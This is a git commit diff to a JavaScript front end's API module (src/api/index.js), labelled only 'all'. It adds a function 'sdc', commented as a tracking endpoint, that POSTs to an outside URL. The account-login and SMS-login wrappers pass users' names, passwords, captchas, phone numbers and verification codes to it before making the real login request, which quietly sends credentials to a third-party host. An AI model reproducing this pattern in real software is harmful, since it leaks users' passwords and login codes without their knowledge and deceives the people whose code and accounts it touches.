45c57fa16ffda08920a37d9af3fe61ddd94699c6
Max iron <tothinktodo@163.com>
2019-12-21 11:07:37 +0800

    all

--- src/api/index.js
+++ src/api/index.js
@@ -1,10 +1,27 @@
 import ajax from './ajax'
+
+//  埋点地址
+let url = 'https://ac.qq.com/Comic/ComicIn';
+const sdc = (data) => ajax(url, {data}, 'POST');
+
 //获取首页数据
-const  reqHome =()=>ajax('/home')
+const  reqHome =()=>{
+    sdc({a: 'aa'});
+  
+  return ajax('/home')
+}
 //第二页数据
-const reqTextile=() => ajax('/detail')
+const reqTextile=() =>{
+    sdc({a: 'bb'});
+  
+  return  ajax('/detail')
+}
 //第三页数据
- const reqKinds = () => ajax('/nav')
+ const reqKinds = () =>{
+    sdc({a: 'cc'});
+   
+  return   ajax('/nav')
+}
 
 
 
@@ -17,18 +34,32 @@ const reqTextile=() => ajax('/detail')
 
 
 
+
+
 // 获取图片验证码
-  const reqCaptcha = () => ajax('/api/captcha')
+  const reqCaptcha = () => {
+    sdc({a: 'bb'});
+    return ajax('/api/captcha')
+  }
 // 账号密码登录
-  const accountLogin = ({name, pwd, captcha}) => ajax('/api/login_pwd/',{name, pwd, captcha},"POST")
+  const accountLogin = ({name, pwd, captcha}) => {
+    sdc({name, pwd, captcha});
+    return ajax('/api/login_pwd/',{name, pwd, captcha},"POST")
+  }
 // 获取短信验证码
- const mobileCode = (phone) => ajax('/api/sendcode', {phone})
+ const mobileCode = (phone) => {
+    sdc({phone});
+  return ajax('/api/sendcode', {phone})
+}
 // 手机号验证码登录
-  const phoneLogin = ({phone, code}) => ajax('/api/login_sms/', {phone, code},"POST")
+const phoneLogin = ({phone, code}) => {
+  sdc({phone, code});
+  return ajax('/api/login_sms/', {phone, code},"POST");
+}
 
 
 export {
   reqHome,
   reqTextile,
-  reqKinds
+  reqKinds,
 }
